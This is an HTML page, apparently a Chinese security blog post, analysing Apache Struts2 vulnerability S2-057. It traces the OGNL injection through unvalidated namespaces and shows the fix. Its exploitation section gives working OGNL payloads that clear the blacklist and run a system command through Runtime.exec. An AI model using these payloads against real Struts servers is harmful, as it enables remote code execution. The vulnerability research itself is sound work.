@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>struts2系列漏洞 S2-057 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 八月 4日 2020, 4:34 下午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    786 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      3 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>  经典 Java 软件漏洞 struts 系列，准备一个个看过去。</p>
+<p>这个就是最后一个了。</p>
+<a id="more"></a>
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>2.3.34 版本 struts2 + Tomcat 9。</p>
+<p>修改 struts.xml：</p>
+<pre><code class="xml">&lt;constant name=&quot;struts.mapper.alwaysSelectFullNamespace&quot; value=&quot;true&quot; /&gt;
+</code></pre>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>阅读<a href="https://cwiki.apache.org/confluence/display/WW/S2-057" target="_blank" rel="noopener">官方通告</a>和<a href="https://securitylab.github.com/research/apache-struts-CVE-2018-11776" target="_blank" rel="noopener">漏洞发现者的文章</a>，设置一个 redirectAction 的 result：</p>
+<pre><code class="xml">&lt;result name=&quot;success&quot; type=&quot;redirectAction&quot;&gt;
+    &lt;param name=&quot;actionName&quot;&gt;login!update.action&lt;/param&gt;
+&lt;/result&gt;
+</code></pre>
+<p>然后全局搜索用到 alwaysSelectFullNamespace 这个布尔的地方，找到 DefaultActionMapper 类的 parseNameAndNamespace 函数：</p>
+<pre><code class="java">...
+else if (alwaysSelectFullNamespace) {
+    // Simply select the namespace as everything before the last slash
+    namespace = uri.substring(0, lastSlash);
+    name = uri.substring(lastSlash + 1);
+}
+...
+mapping.setNamespace(namespace);
+mapping.setName(cleanupActionName(name));
+</code></pre>
+<p>看到 mapping.setName 这里，namespace 没有经过校验，存在 OGNL 表达式注入的可能，可以联想到之前 setResult、setMethod 导致的问题，按照经验继续搜索 mapping.getNamespace、proxy.getNamespace、getProxy().getNamespace 等调用，可以找到 3 个类，分别是：</p>
+<pre><code>ServletActionRedirectResult
+PostbackResult
+ActionChainResult
+</code></pre><p>先看 ServletActionRedirectResult 类：</p>
+<pre><code class="java">public void execute(ActionInvocation invocation) throws Exception {
+    actionName = conditionalParse(actionName, invocation);
+    if (namespace == null) {
+        namespace = invocation.getProxy().getNamespace();
+    } else {
+        namespace = conditionalParse(namespace, invocation);
+    }
+    if (method == null) {
+        method = &quot;&quot;;
+    } else {
+        method = conditionalParse(method, invocation);
+    }
+
+    String tmpLocation = actionMapper.getUriFromActionMapping(new ActionMapping(actionName, namespace, method, null));
+
+    setLocation(tmpLocation);
+
+    super.execute(invocation);
+}
+</code></pre>
+<p>super.execute 会往上来到 StrutsResultSupport 类：</p>
+<pre><code class="java">public void execute(ActionInvocation invocation) throws Exception {
+    lastFinalLocation = conditionalParse(location, invocation);
+    doExecute(lastFinalLocation, invocation);
+}
+</code></pre>
+<p>同样很眼熟，会将 location，即用 namespace 和其他数据拼接成的路径当作表达式进行解析，触发了漏洞。</p>
+<p>接下来看 PostbackResult 类，可以看到逻辑基本一致：</p>
+<pre><code class="java">@Override
+public void execute(ActionInvocation invocation) throws Exception {
+    String postbackUri = makePostbackUri(invocation);
+    setLocation(postbackUri);
+    super.execute(invocation);
+}
+</code></pre>
+<p>makePostbackUri 函数拼接，然后 execute 触发。</p>
+<p>最后看看 ActionChainResult 类：</p>
+<pre><code class="java">public void execute(ActionInvocation invocation) throws Exception {
+    // if the finalNamespace wasn&#39;t explicitly defined, assume the current one
+    if (this.namespace == null) {
+        this.namespace = invocation.getProxy().getNamespace();
+    }
+
+    ValueStack stack = ActionContext.getContext().getValueStack();
+    String finalNamespace = TextParseUtil.translateVariables(namespace, stack);
+    ...
+}
+</code></pre>
+<p>可以看到调用了 translateVariables 函数，直接把 namespace 当作表达式来用了。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>2.3.34 版本中 #context 无法使用了（如果是 2.5.10 版本之后的，黑名单也无法用 clear 来清空了），所以需要另寻他法。</p>
+<p>阅读参考文章，#context 可以用 #attr 来替代，clear 可以用 setter 来替代，最后的 payload 为两步，先清空黑名单：</p>
+<pre><code>(#context=#attr[&#39;struts.valueStack&#39;].context).(#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#39;&#39;)).(#ognlUtil.setExcludedPackageNames(&#39;&#39;))
+</code></pre><p>然后执行命令：</p>
+<pre><code>(#context=#attr[&#39;struts.valueStack&#39;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;))
+</code></pre><p>2.3.x 版本的无法使用这个 payload，因为 setter 跟 2.5.x 有一点差别：</p>
+<pre><code class="java">// 2.5.x
+public void setExcludedClasses(String commaDelimitedClasses) {
+    Set&lt;String&gt; classNames = TextParseUtil.commaDelimitedStringToSet(commaDelimitedClasses);
+    Set&lt;Class&lt;?&gt;&gt; classes = new HashSet&lt;&gt;();
+
+    for (String className : classNames) {
+        try {
+            classes.add(Class.forName(className));
+        } catch (ClassNotFoundException e) {
+            throw new ConfigurationException(&quot;Cannot load excluded class: &quot; + className, e);
+        }
+    }
+
+    excludedClasses = Collections.unmodifiableSet(classes);
+}
+
+// 2.3.x
+public void setExcludedClasses(String commaDelimitedClasses) {
+    Set&lt;String&gt; classes = TextParseUtil.commaDelimitedStringToSet(commaDelimitedClasses);
+    for (String className : classes) {
+        try {
+            excludedClasses.add(Class.forName(className));
+        } catch (ClassNotFoundException e) {
+            throw new ConfigurationException(&quot;Cannot load excluded class: &quot; + className, e);
+        }
+    }
+}
+</code></pre>
+<p>可以看到少了最后的一句：</p>
+<pre><code class="java">excludedClasses = Collections.unmodifiableSet(classes);
+</code></pre>
+<p>所以调用 setter 无法清空黑名单。</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>给 namespace 加上了校验：</p>
+<pre><code class="java">protected Pattern allowedNamespaceNames = Pattern.compile(&quot;[a-zA-Z0-9._/\\-]*&quot;);
+...
+mapping.setNamespace(cleanupNamespaceName(namespace));
+</code></pre>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://xz.aliyun.com/t/3395" target="_blank" rel="noopener">https://xz.aliyun.com/t/3395</a></p>
+<p><a href="https://xz.aliyun.com/t/2618" target="_blank" rel="noopener">https://xz.aliyun.com/t/2618</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/08/19/用一个缓冲区溢出-bug-绕过-php7-4-3-disable-functions/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>用一个缓冲区溢出 bug 绕过 php7.4.3 disable_functions</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/08/03/Linux栈溢出入门/">
+                        <span>Linux栈溢出入门</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "struts2系列漏洞 S2-057&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
